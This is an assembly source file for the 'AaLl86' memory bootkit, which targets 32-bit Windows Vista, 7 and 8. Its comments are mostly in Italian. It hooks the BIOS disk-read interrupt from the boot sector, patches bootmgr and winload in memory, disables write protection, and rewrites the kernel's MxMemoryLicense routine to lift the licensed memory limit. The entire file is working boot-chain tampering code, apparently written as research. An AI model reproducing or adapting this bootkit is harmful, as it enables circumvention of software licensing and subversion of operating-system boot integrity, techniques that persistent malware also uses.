;AaLl86 Windows Vista/Seven/Eight x86 Memory Bootkit
;Main program - Standard Boot Sector
;Compile with FASM: https://flatassembler.net/
;Copyright© 2013 Andrea Allievi

INCLUDE "RamBootkit.inc"
ORG 0

main:
jmp start
SIGNATURE db 0,0,"AaLl86",0,0
;Global offsets:
BmMainOffset dd 0a8ch                    ; offset jump to bootmgr BmMain

; Windows 7 Signatures
bootmgr_firstbyte db 00h
pad db 00h
bootmgr_signature dd 03B51447Eh          ; last four bytes of bootmgr
; Windows Seven SP1 MxMemoryLicense: 0x03A6BA2 - Vista SP2: 0x035444C
Memory_License_Start dd 0340000h

; Windows Vista SP1 Signature
;bootmgr_firstbyte db 06Fh
;pad db 00h
;bootmgr_signature dd 01802787dh          ; last four bytes of bootmgr
; Vista SP2 MxMemoryLicense: 0x035444C
;Memory_License_Start dd 0340000h

;Windows 8 Release Preview Signatures:
;bootmgr_firstbyte db 0E1h
;pad db 00h
;bootmgr_signature dd 0E09FB737h         ; last four bytes of bootmgr
; Windows 8 Release Preview MxMemoryLicense: 0x05153c0
;Memory_License_Start dd 0500000h

dw 0

start:
    cli
    mov ax, cs
    ; Ora imposta uno stack decente
    mov ss, ax                  ; Stack Segment
    mov [ss:0ffeh], sp          ; Salva il vecchio Stack Pointer in [0ffeh]... Il perchè? semplice: 1000 - 0FFE = 2
    mov sp, 0ffeh               ; Alla fine del codice quando lo SP è a 0x1000 posso fare un pop sp
    push ds
    pushad

    ; Time to hook Int13h
    xor    bx, bx
    mov    ds, bx
    mov    eax, dword [bx+4Ch]                   ; Cosa conterrà mai 0x004ch? Semplice contiene l'interrupt 13h location
    ;mov   word ptr [bx+4ch], 6ah                ; 13h = 19 * 4 = 76d = 4ch.  6ah è un offset????
    mov    word [bx+4Ch], int_13h                ; Certo è l'offset dell'int_13h
    ;mov   es:word ptr[77h], eax                 ; Il 77h è un offset che punta all'istruzione far jmp 0000:0000
    mov    dword [cs:original_int13], eax        ; Riempie l'indirizzo di ritorno del far jmp dell'int 13h modificato
    mov    word [bx+4Eh], cs                     ; Ora piazza il selector modificato nella locazione della interrupt 13h

    popad
    pop ds
    pop sp
    jmp far 0000h:LOADLOC


int_13h:
    ; Questa è la ISR dell'int 13h modificata
    pushf
    cmp    ah, 42h                      ; Se AH = 42h: Extended Read Sectors From Drive
    jz short Int13_Read_Request
    cmp    ah, 02h                      ; Se AH = 02h: Read Sectors From Drive
    jz short Int13_Read_Request
    popf

    db  0eah         ; jmp far ...   jmp far 0000:0000h
    dd 0h            ; runtime filled, original int 13h
original_int13 = $-4

Int13_Read_Request:
    mov byte [cs:function_type], ah   ; Salva la funzione originale nel registro CH dopo

    ; Chiama il vero Int13 Handler per eseguire la richiesta di lettura vera
    call dword [cs:original_int13]        ; Call far indirect
    jc Int13Hook_ret                      ; Se c'è un errore di lettura esci dalla procedura
    pushf
    pushd edx
    push es

    ; Adjust registers to internally emulate an AH=02h read if AH=42h was used
    cld
    mov    ah, 00h                        ; AH sempre settato a 0
    mov    ch, 00h                        ; INT 13 - Posiziona la funzione giusta nel reg. CH
    function_type = $-1

    cmp    ch, 42h                        ; Guarda se la funzione che vado a richiamare è la
    jnz short Int13Hook_notExtRead        ; AH = 42h: Extended Read Sectors From Drive

    ; Codice seguente eseguito se la funzione è la AH = 42h: Extended Read Sectors From Drive
    ; In poche parole converte la Extended Read Sector in una Read Sector (AH = 02h)
    lodsw                        ; Load word at address DS:SI into AX
    lodsw                        ; +02h  WORD    number of blocks to transfer
    les    bx, [si]              ; Load ES:BX with far pointer from memory +04h  DWORD   transfer buffer

Int13Hook_notExtRead:
    test   ax, ax                ; CODICE utile se il numero di settori da leggere è 0 (vedi sopra)
    jnz    $+3                   ; Se AX è 0 lo aumento di 1
    inc    ax
    xor    cx, cx
    mov    cl, al                ; AL = Numero di settori da leggere

    ; Codice filtro per evitare le enormi letture
    and cl, 7Fh

L1:
    shl cx, 9            ; (AL * 200h)
    xor ax, ax           ; Cerco il primo byte 00h
    mov al, byte [cs:bootmgr_firstbyte]
    mov di, bx           ; BX = DI = puntatore alla memoria in cui risiede il/i settore/i appena letto
    mov edx, dword [cs:bootmgr_signature]

; Loop alla ricerca della firma dell'bootmgr
Int13Hook_scan_loop:
    repne scasb
    jcxz Int13Hook_scan_done
    ; Devo cercare il pattern 7e 44 51 3b (signature del bootmgr)

    cmp dword [ES:DI], edx
    jnz Int13Hook_scan_loop

signature_found:
    mov ax, 2000h              ; We don't need this: ES is already the right segment,
    mov es, ax                 ; because of CMP instruction just made

    mov ax, CODEBASEIN1MB
    mov ds, ax
    mov si, BOOTMGR_16_BIT_PATCH_STARTS
    mov di, word [cs:BmMainOffset]

    ; bootmgr!main + BmMainOffset (0x0a8c)
    ; 6652         push edx       <- Applica la patch qui
    ; 6655         push ebp
    ; 6633ed       xor ebp, ebp
    ; 666a20       push 20h
    ; 6653         push ebx       <- EBX xosa contiene? 0x40100, Entry point del OSLOADER.EXE.
    ; 66cb         retf

    mov cx, BOOTMGR_16_BIT_PATCH_ENDS - BOOTMGR_16_BIT_PATCH_STARTS
    rep movsb                ; Muove i dati da DS:SI (9c00:BOOTMGR_16_BIT_PATCH_STARTS) in ES:DI (0x2000:0x0a8c)

    ;Restore old INT13 routine
    push    ebx
    push    es
    xor     bx, bx
    mov     es, bx
    mov     ebx, dword [cs:original_int13]
    mov     dword [es:04ch], ebx
    pop     es
    pop     ebx

Int13Hook_scan_done:
    ;popad
    pop es
    pop edx
    popf

Int13Hook_ret:
    retf  02h


BOOTMGR_16_BIT_PATCH_STARTS:
    mov     ebx, CODEBASEIN1MBEXACT + BOOTMGR_PATCHER_START
    ; Si traduce in: 66 BB xx 09 c0 00
    nop
BOOTMGR_16_BIT_PATCH_ENDS:

; |---------------------------------------------------------------------------------------------------------------|
; |                                  INIZIO codice a 32 bit Protected Mode                                        |
; |---------------------------------------------------------------------------------------------------------------|
use32
BOOTMGR_PATCHER_START:
    push    edx
    push    ebp

  ; Bootmgr trasferisce il controllo al Winload in questa routine:
  ; bootmgr!Archx86TransferTo32BitApplicationAsm:
  ; 00450a10 55              push    ebp                <-- Applica qui la patch
  ; 00450a11 56              push    esi
  ; 00450a12 57              push    edi                <-- EDI = Winload base address
  ; 00450a13 53              push    ebx
  ; 00450a14 06              push    es
  ; 00450a15 1e              push    ds
  ; 00450a16 8bdc            mov     ebx,esp
  ; 00450a18 0f 0105 b81b4900  sgdt    fword ptr [bootmgr!GdtRegister (00491bb8)]
  ; 00450a1f 0f010d d81b4900  sidt    fword ptr [bootmgr!IdtRegister (00491bd8)]
  ; 00450a26 0f0115 f01b4900  lgdt    fword ptr [bootmgr!BootAppGdtRegister (00491bf0)]
  ; 00450a2d 0f011d c01b4900  lidt    fword ptr [bootmgr!BootAppIdtRegister (00491bc0)]
  ; 00450a34 33ed            xor     ebp,ebp

   ; Offset 0009F0E0
   push edi
   push ecx
   mov  edi, BOOTMGR_BASE
   mov  ecx, BOOTMGR_MAX_SIZE

   mov  al, 0Fh

_search_bmgr:
   repne scasb
   jecxz _bmgr_not_found
   ;cmp dword [edi-7], 01e065357h
   ;jnz _search_bmgr

   cmp word [edi], 0501h        ; SGDT Instruction?
   jnz _search_bmgr

   cmp word [edi+6], 010fh      ; SIDT Instruction?
   jnz _search_bmgr

   cmp word [edi+0Eh], 1501h
   jnz _search_bmgr

   cmp word [edi+14h], 010fh
   jnz _search_bmgr

   sub  edi, 9
   mov  byte [edi], 0x68   ; PUSH imm32 opcode
   mov  dword [edi+1],  CODEBASEIN1MBEXACT + BOOTMGR_PATCH_START
   mov  byte [edi+5], 0xc3 ; RET opcode

   ; Stampa il return address nella routine modificata nel Winload
   add  edi, 6         ; 6 = sizeof(CUTTED_INSTRUCTION)
   mov  dword [CODEBASEIN1MBEXACT + BOOTMGR_RETURN_ADDRESS], EDI

_bmgr_not_found:
   pop  ecx
   pop  edi
   mov  ebx, BOOTMGR_BASE + BOOTMGR_EP_RVA       ; 401000 è l'entry point dell'OSLOADER.exe
                            ; kd> ln 401000
   push  ebx                ; Exact matches: (00401000) bootmgr!BmMain = <no type information>
   ret                      ; Passa il controllo al bootmgr!BmMain

BOOTMGR_PATCHER_ENDS:

; |-------------------------------------------------------------------------------------------------------|
; |                                        BOOTMGR SECOND PATCH                                           |
; Codice che va in esecuzione nel momento prima in cui il controllo sta per essere trasferito al Winload
; (quindi ancora a 32 bit Protected Mode with Pagining). La funzione da cui va in esecuzione il
; codice seguente è questa (vedi sopra):
; bootmgr!Archx86TransferTo32BitApplicationAsm
;        Funzione da modificare:  winload!OslArchTransferToKernel

BOOTMGR_PATCH_START:
   mov  eax, cr0        ;Disable paging and write protection
   and  eax, 07fffffffh
   mov  cr0, eax

   ; Cutted instruction (6 bytes)
   push  ebp
   push  esi
   push  edi            ; <-- EDI = Winload base address
   push  ebx
   push  es
   push  ds

  ; Vista winload!OslArchTransferToKernel:
  ; e8e1effcff      call    winload!BlBdStop (00263cfa)
  ; 0f01 15a8 ce35 00  lgdt    fword ptr [winload!OslKernelGdt (0035cea8)]
  ; 0f01 1da0 ce35 00  lidt    fword ptr [winload!OslKernelIdt (0035cea0)]
  ; 66b81000        mov     ax,10h   <-- Apply patch here
  ; 668ed8          mov     ds,ax

  ; Win7/8 winload!OslArchTransferToKernel:
  ; 0032a0c8 0f 01 15 68 cb 37 00  lgdt    fword ptr [winload!OslKernelGdt (0037cb68)] ds:0030:0037cb68=80b9900003ff
  ; 0032a0cf 0f 01 1d 60 cb 37 00  lidt    fword ptr [winload!OslKernelIdt (0037cb60)]
  ; 0032a0d6 66 b8 10 00       mov     ax,10h      <-- Apply patch here
  ; 0032a0da 66 8e d8          mov     ds,ax
  ; 0032a0dd 66 8e c0          mov     es,ax
  ; 0032a0e0 66 8e d0          mov     ss,ax
  ; 0032a0e3 668ee8          mov     gs,ax
  ; 0032a0e6 66b83000        mov     ax,30h
  ; 0032a0ea 668ee0          mov     fs,ax
  ; 0032a0ed 66b82800        mov     ax,28h
  ; 0032a0f1 0f00d8          ltr     ax
  ; 0032a0f4 8b4c2404        mov     ecx,dword ptr [esp+4]
  ; 0032a0f8 8b442408        mov     eax,dword ptr [esp+8]
  ; 0032a0fc 33d2            xor     edx,edx
  ; 0032a0fe 51              push    ecx
  ; 0032a0ff 52              push    edx
  ; 0032a100 6a08            push    8
  ; 0032a102 50              push    eax
  ; 0032a103 cb              retf

   ; Qui verifica la firma della funzione OslArchTransferToKernel
   push edi
   push ecx
   mov ecx, 00200000h    ; 0x200000 = Max search length
   mov al, 0Fh

_winload_search:
   repne scasb
   jecxz _winload_not_found

   cmp  word [edi], 1501h         ; 0f 01 15 68 (lgdt fword ptr ... )
   jne _winload_search           ; ... Se l'offset è cannato la cerca

   cmp word [edi+6], 010fh
   jne _winload_search

   cmp dword [edi+0Dh], 0010B866h       ;  mov     ax,10h
   jne _winload_search

   cmp dword [edi+11h], 066D88E66h       ;  mov     ds,ax
   jne _winload_search

;   cmp dword [edi+15h], 08e66c08eh       ;  mov     es,ax
;   jne _winload_search

OslArchToKernelFound:
    ; winload!OslArchTransferToKernel Modificato:
    ; B8 XX XX XX XX mov eax, addr_of_patchcode
    ; FF E0 jmp eax

    add edi, 0Dh
    mov byte [edi], 0xB8                                    ; MOV EAX, Opcode
    mov dword [edi+01], CODEBASEIN1MBEXACT + WINLOAD_PATCH  ; IMM32 Offset
    mov word [edi+05], 0xe0ff                               ; JMP EAX

    add edi, 07h           ;07 è la dimensione delle istruzioni scritte

    ; Stampa il return address nella routine modificata nel Winload
    mov dword [CODEBASEIN1MBEXACT + WINLOAD_RETURN_ADDRESS], edi

_winload_not_found:
    pop ecx
    pop edi

    db  068h                     ; PUSH imm32 OPCODE -> Push sign-extended imm32
BOOTMGR_RETURN_ADDRESS: dd 0     ; filled at runtime...
    ret
BOOTMGR_PATCH_END:

; |-------------------------------------------------------------------------------------------------------|
; |                                        WINLOAD PATCH                                                  |
; Codice che va in e secuzione nel momento prima in cui il controllo sta per essere trasferito al NTOSKRNL.EXE
; (quindi a 32 bit Protected Mode with Pagining). La funzione da cui va in esecuzione il codice seguente è questa (vedi sopra):
; winload!OslArchTransferToKernel
;
; OslArchTransferToKernel quando va in esecuzione ha già mappato in memoria NTOSKRNL.EXE. Quindi
; non devo far altro che trovare l'indirizzo in cui è mappato NTOSKRNL. Lo posso fare perchè al momento
; di partire OslArchTransferToKernel ha nel registro RDX l'indirizzo della nt!KiSystemStartup 
; (funzione del NTOSKRNL). Quindi non devo far altro che cercare all'indietro la firma del PE
; di NTOSKRNL.EXE (MZ -> Mark Zibrowski)
; QUINDI Funzione context del codice seguente:  winload!OslArchTransferToKernel
;        Funzione da modificare:  Qualsiasi del NTOSKRNL.EXE
WINLOAD_PATCH:

    push  edi
    mov   edi, dword [esp+0Ch]       ; <-- EAX = KiSystemStartup Virtual Address
    ; Devo trovare in memoria l'indirizzo iniziale ntOsBase
    push  ecx                     ; quindi cerca in memoria

    ; Cerca in memoria la firma del PE
    mov eax, 00905A4Dh          ; MZ ...
    mov ecx, NTOSKRNL_SIZE              ; size

    std      ; Reimposta il Directional Flag per le ricerche sulla sequenza di bytes

Kernel_srch:
    ; Inizia la ricerca con il primo byte (4D -> 'M')
    repne scasb       ; Compara il byte presente in AL con il byte puntato da RDI
    jecxz short  _srch_fail

    ; Va avanti con la ricerca, compara tutto il registro EAX con la memoria puntata da EDI+1
    cmp  [edi+1], eax    ; In pratica verifica la firma dell'NTOSKRNL
    jne  short Kernel_srch

    ; EDI ora punta ad un byte prima del 4D 5A (MZ)
    cld       ; ... e siamo sicuri che la memoria è l'NTOSKRNL
    inc edi     ; EDI ora punta a ntOsBase

START_NT_MODIFICATIONS:
    ; QUI Esegue la modifica vera e propria al kernel di Windows
    ; NTSTATUS __stdcall MxMemoryLicense(arg0, arg1)
    ; Pattern to seacrh:
    ; 85 c0            test    eax,eax
    ; 74 xx            je      nt!MxMemoryLicense+0x68 (81ba64b4)
    ; c1 e0 08          shl     eax,8
    ; a3 xx xx xx xx  mov     dword ptr [nt!MiTotalPagesAllowed (8198962c)],eax
    ; eb0a            jmp     nt!MxMemoryLicense+0x72
    ; c7 05 xx xx xx xx 00000800  mov dword ptr [nt!MiTotalPagesAllowed (8198962c)],80000h
    add edi, dword [Memory_License_Start + CODEBASEIN1MBEXACT]
    mov ecx, 0F0000h
    mov al, 085h

MemLicense_Search:
    repne scasb
    jecxz _srch_fail
    cmp word[edi-1], 0c085h
    jne MemLicense_Search
    cmp byte[edi+1], 074h
    jne MemLicense_Search
    cmp dword[edi+3], 0a308e0c1h
    jne MemLicense_Search

    ; B8 00 00 A0 00  mov eax, 0x0a00000
    mov dword[edi+1], 0A00000B8h
    mov byte[edi+5], 00h

    ; Now search:
    ; Windows 7/Vista:
    ; 7c 10            jl      nt!MxMemoryLicense+0xa8 (81ba64f4)
    ; or Windows 8:
    ; 78 0D            js      nt!MxMemoryLicense+0xa8 (091545Dh)

    ; 8b 45 fc         mov     eax,dword ptr [ebp-4]          <- Apply patch here
    ; 85 c0            test    eax,eax
    ; 74 xx            je      nt!MxMemoryLicense+0xa8 (81ba64f4)
    add edi, 10h
    mov ecx, 080h
    mov al, 08bh

MemLicense_Search2:
    repne scasb
    jecxz _srch_fail

    cmp dword[edi], 0c085fc45h
    ;cmp word[edi+1], 0458bh
    jne MemLicense_Search2
    mov byte [edi-3], 0ebh              ; JMP Rel16 opcode

_srch_fail:
    pop  ecx
    pop  edi
    mov ax, 10h
    mov ds, ax

    db  068h             ; PUSH imm32 OPCODE -> Push sign-extended imm32
WINLOAD_RETURN_ADDRESS: dd 0 ; filled at runtime...
    ret

ends:
times 1022-($-main) db 0        ; 1024 total bytes
signa   db 55h,0aah             ;signature